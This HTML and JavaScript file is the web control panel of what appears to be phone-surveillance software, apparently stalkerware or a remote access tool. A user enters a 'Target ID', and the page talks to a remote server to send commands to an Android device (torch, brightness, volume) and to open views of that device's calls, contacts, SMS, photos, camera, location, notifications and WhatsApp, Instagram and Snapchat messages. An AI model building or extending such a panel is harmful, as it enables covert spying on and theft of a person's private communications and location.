<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Center</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: #000000;
            --glass-panel: rgba(30, 30, 30, 0.65);
            --glass-border: rgba(255, 255, 255, 0.15);
            --text-main: #ffffff;
            --text-sub: #b0b0b0;
            --accent-active: #ffffff;
            --slider-bg: rgba(60, 60, 60, 0.5);
            --slider-fill: rgba(255, 255, 255, 1);
        }

        body {
            background-color: var(--bg-dark);
            /* Background image to show off glass effect */
            background-image: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2564&auto=format&fit=crop'); 
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0; 
            padding: 20px;
            display: flex; 
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            backdrop-filter: blur(20px); /* Heavy blur on background */
        }

        /* --- Main Container (Phone shape on Desktop) --- */
        .container {
            width: 100%;
            max-width: 420px; /* Looks like a phone on laptop */
            background: rgba(0, 0, 0, 0.4);
            border-radius: 40px;
            padding: 25px;
            border: 1px solid var(--glass-border);
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        /* --- Header Section --- */
        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 25px;
        }
        .device-info h2 { margin: 0; font-size: 1.2rem; font-weight: 600; }
        .device-info p { margin: 0; font-size: 0.8rem; color: var(--text-sub); display: flex; align-items: center; gap: 5px; }
        
        .status-pill {
            background: rgba(255,255,255,0.1);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            display: flex; align-items: center; gap: 6px;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(5px);
        }
        .dot { width: 8px; height: 8px; background: #4caf50; border-radius: 50%; box-shadow: 0 0 8px #4caf50; }

        /* --- Info Card (Version/Network/Battery) --- */
        .info-card {
            background: var(--glass-panel);
            border-radius: 25px;
            padding: 20px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            font-size: 0.8rem;
            border: 1px solid var(--glass-border);
        }
        .info-col { display: flex; flex-direction: column; gap: 5px; }
        .label { color: var(--text-sub); font-size: 0.7rem; letter-spacing: 1px; text-transform: uppercase; }
        .value { font-weight: 500; }

        /* --- GRID LAYOUT (The Main Control Center) --- */
        .controls-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr); /* 4 Columns */
            grid-auto-rows: 85px; /* Fixed height for squares */
            gap: 15px;
        }

        /* Standard Square Button */
        .btn-card {
            background: var(--glass-panel);
            border-radius: 22px;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            border: 1px solid var(--glass-border);
            cursor: pointer;
            transition: transform 0.2s, background 0.2s;
            text-decoration: none; color: white;
            position: relative; overflow: hidden;
        }
        .btn-card:hover { background: rgba(50, 50, 50, 0.7); }
        .btn-card:active { transform: scale(0.95); }
        
        .btn-card i { font-size: 1.5rem; margin-bottom: 8px; }
        .btn-card span { font-size: 0.65rem; color: var(--text-sub); }

        /* Toggle Active State (For Torch) */
        .btn-card.active { background: rgba(255, 255, 255, 0.9); color: #000; }
        .btn-card.active span { color: #333; }

        /* --- VERTICAL SLIDERS (Spanning 2 Rows) --- */
        .slider-card {
            grid-row: span 2; /* Takes height of 2 buttons */
            background: var(--slider-bg);
            border-radius: 25px;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: flex-end; /* Fill from bottom */
            justify-content: center;
            border: 1px solid var(--glass-border);
        }

        /* The White Fill */
        .slider-fill {
            position: absolute;
            bottom: 0; left: 0; right: 0;
            background: var(--slider-fill);
            width: 100%;
            height: 50%; /* JS will change this */
            transition: height 0.15s ease-out;
            pointer-events: none;
        }

        /* The Icon inside slider */
        .slider-icon {
            position: absolute;
            bottom: 25px;
            font-size: 1.5rem;
            z-index: 5;
            color: #555; /* Dark on white */
            transition: color 0.2s;
        }

        /* Invisible Range Input on top */
        .vertical-range {
            position: absolute;
            width: 200px; /* Make it long enough when rotated */
            height: 100%;
            top: 0; left: 50%;
            transform: translate(-50%, 0) rotate(-90deg); /* Rotate to make vertical */
            opacity: 0;
            cursor: ns-resize;
            z-index: 10;
        }

        /* ID Input Overlay */
        .id-input-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 999;
            display: none; justify-content: center; align-items: center; flex-direction: column;
        }
        .id-input-box {
            background: #222; padding: 20px; border-radius: 15px; text-align: center;
            border: 1px solid #444;
        }
        .id-input-box input {
            padding: 10px; border-radius: 8px; border: none; outline: none; margin-bottom: 10px;
            text-transform: uppercase;
        }
        .id-input-box button {
            padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer;
        }

    </style>
</head>
<body>

    <div id="idOverlay" class="id-input-overlay">
        <div class="id-input-box">
            <h3>Enter Target ID</h3>
            <input type="text" id="idInput" placeholder="Device ID">
            <button onclick="saveID()">Connect</button>
        </div>
    </div>

    <div class="container">
        <div class="header">
            <div class="device-info">
                <h2 id="deviceName">VIVO V2225C</h2>
                <p><i class="fa-solid fa-battery-half"></i> <span id="batteryPercent">--%</span> &bull; <i class="fa-solid fa-wifi"></i></p>
            </div>
            <div class="status-pill">
                <div class="dot" id="statusDot"></div>
                <span id="statusText">Connected</span>
            </div>
        </div>

        <div class="info-card">
            <div class="info-col">
                <span class="label">Version</span>
                <span class="value" id="androidVer">15</span>
            </div>
            <div class="info-col">
                <span class="label">Network</span>
                <span class="value" id="ipAddress">192.168.1.1</span>
            </div>
            <div class="info-col">
                <span class="label">Status</span>
                <span class="value" id="batteryStatus">Good</span>
            </div>
        </div>

        <div class="controls-grid">
            
            <div onclick="openView('call_logs')" class="btn-card"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
            <div onclick="openView('contacts')" class="btn-card"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
            <div onclick="openView('sms')" class="btn-card"><i class="fa-solid fa-comments"></i><span>Messages</span></div>
            <div onclick="toggleTorch()" id="torchBtn" class="btn-card"><i class="fa-solid fa-flashlight"></i><span>Torch</span></div>

            <div onclick="openView('gallery')" class="btn-card"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
            <div onclick="openView('camera')" class="btn-card"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
            
            <div class="slider-card">
                <div class="slider-fill" id="brightFill" style="height: 50%;"></div>
                <i class="fa-solid fa-sun slider-icon" id="brightIcon"></i>
                <input type="range" min="0" max="100" value="50" class="vertical-range" 
                       oninput="updateSlider('bright', this.value)" 
                       onchange="sendSliderCmd('brightness', this.value)">
            </div>

            <div class="slider-card">
                <div class="slider-fill" id="volFill" style="height: 50%;"></div>
                <i class="fa-solid fa-volume-high slider-icon" id="volIcon"></i>
                <input type="range" min="0" max="100" value="50" class="vertical-range" 
                       oninput="updateSlider('vol', this.value)" 
                       onchange="sendSliderCmd('volume', this.value)">
            </div>

            <div onclick="openView('whatsapp')" class="btn-card"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></div>
            <div onclick="openView('instagram')" class="btn-card"><i class="fa-brands fa-instagram"></i><span>Instagram</span></div>
            
            <div onclick="openView('snapchat')" class="btn-card"><i class="fa-brands fa-snapchat"></i><span>Snapchat</span></div>
            <div onclick="openView('location')" class="btn-card"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
            <div onclick="openView('notifications')" class="btn-card"><i class="fa-regular fa-message"></i><span>Notify</span></div>
            <div onclick="openView('apps')" class="btn-card"><i class="fa-brands fa-google-play"></i><span>Apps</span></div>

        </div>
    </div>

    <script>
        const API_BASE = 'https://child-v9no.onrender.com';
        let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
        let isTorchOn = false;

        // --- ID Handling ---
        function checkID() {
            if(!DEVICE_ID) {
                document.getElementById('idOverlay').style.display = 'flex';
            } else {
                document.getElementById('idOverlay').style.display = 'none';
                updateDashboard();
            }
        }

        function saveID() {
            const val = document.getElementById('idInput').value.trim().toUpperCase();
            if(val) {
                DEVICE_ID = val;
                localStorage.setItem('monitoring_id', DEVICE_ID);
                checkID();
            }
        }

        // --- Slider Logic (Visual + Command) ---
        function updateSlider(type, val) {
            // Update Height
            document.getElementById(`${type}Fill`).style.height = val + "%";
            
            // Icon Color Logic (White on dark, Dark on white)
            // Icon sits at roughly 15-20% height visually
            const icon = document.getElementById(`${type}Icon`);
            if(val > 25) {
                icon.style.color = "#333"; 
            } else {
                icon.style.color = "#fff";
            }
        }

        function sendSliderCmd(cmdType, val) {
            console.log(`Sending ${cmdType}: ${val}`);
            sendCommand(`${cmdType}:${val}`);
        }

        // --- Standard Functions ---
        function toggleTorch() {
            isTorchOn = !isTorchOn;
            const btn = document.getElementById('torchBtn');
            if(isTorchOn) {
                btn.classList.add('active');
                sendCommand('torch_on');
            } else {
                btn.classList.remove('active');
                sendCommand('torch_off');
            }
        }

        function openView(page) {
            if(page === 'whatsapp' || page === 'instagram' || page === 'snapchat') {
                window.location.href = `view_notifications.html?id=${DEVICE_ID}&filter=${page}`;
            } else {
                window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
            }
        }

        function sendCommand(action) {
            fetch(`${API_BASE}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: action })
            });
        }

        function updateDashboard() {
            if (!DEVICE_ID) return;
            fetch(`${API_BASE}/api/device-status/${DEVICE_ID}`)
                .then(res => res.json())
                .then(data => {
                    if(data.id) {
                        document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
                        document.getElementById('androidVer').innerText = data.version || "12";
                        document.getElementById('batteryPercent').innerText = (data.battery || 0) + "%";
                        document.getElementById('batteryStatus').innerText = data.charging ? "Charging" : "Discharging";
                        
                        const dot = document.getElementById('statusDot');
                        const txt = document.getElementById('statusText');
                        
                        if(data.isOnline) {
                            dot.style.background = "#4caf50";
                            dot.style.boxShadow = "0 0 8px #4caf50";
                            txt.innerText = "Connected";
                        } else {
                            dot.style.background = "#ff4444";
                            dot.style.boxShadow = "0 0 8px #ff4444";
                            txt.innerText = "Offline";
                        }
                    }
                })
                .catch(e => console.log(e));
        }

        setInterval(updateDashboard, 5000);
        window.onload = checkID;
    </script>
</body>
</html>
